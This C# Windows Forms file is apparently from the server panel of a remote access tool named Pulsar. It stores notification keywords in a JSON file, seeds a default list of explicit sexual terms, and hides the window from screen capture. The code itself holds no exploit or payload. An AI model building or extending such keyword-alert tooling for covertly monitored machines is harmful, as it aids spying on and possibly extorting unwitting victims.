using Newtonsoft.Json;
using Pulsar.Server.Forms.DarkMode;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmKeywords : Form
    {
        private static readonly string PulsarStuffDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PulsarStuff");

        public FrmKeywords()
        {
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private void SaveNoti_Click(object sender, EventArgs e)
        {
            string text = NotiRichTextBox.Text;
            var keywords = text.Split(',')
                               .Select(word => word.Trim())
                               .Where(word => !string.IsNullOrWhiteSpace(word))
                               .ToList();
            string json = JsonConvert.SerializeObject(keywords, Formatting.Indented);
            string filePath = Path.Combine(PulsarStuffDir, "keywords.json");
            if (!Directory.Exists(PulsarStuffDir))
            {
                Directory.CreateDirectory(PulsarStuffDir);
            }
            File.WriteAllText(filePath, json, Encoding.UTF8);
            MessageBox.Show("Keywords saved successfully!");
        }

        private void FrmKeywords_Load(object sender, EventArgs e)
        {
            string filePath = Path.Combine(PulsarStuffDir, "keywords.json");
            if (!File.Exists(filePath))
            {
                var exampleKeywords = new List<string> { "porn", "sex", "xxx", "hentai", "boobs", "tits", "cock", "dick", "pussy" };
                string exampleJson = JsonConvert.SerializeObject(exampleKeywords, Formatting.Indented);
                if (!Directory.Exists(PulsarStuffDir))
                {
                    Directory.CreateDirectory(PulsarStuffDir);
                }
                File.WriteAllText(filePath, exampleJson, Encoding.UTF8);
            }
            if (File.Exists(filePath))
            {
                string json = File.ReadAllText(filePath, Encoding.UTF8);
                var keywords = JsonConvert.DeserializeObject<List<string>>(json);
                if (keywords != null && keywords.Any())
                {
                    NotiRichTextBox.Text = string.Join(", ", keywords);
                }
            }
        }
    }
}
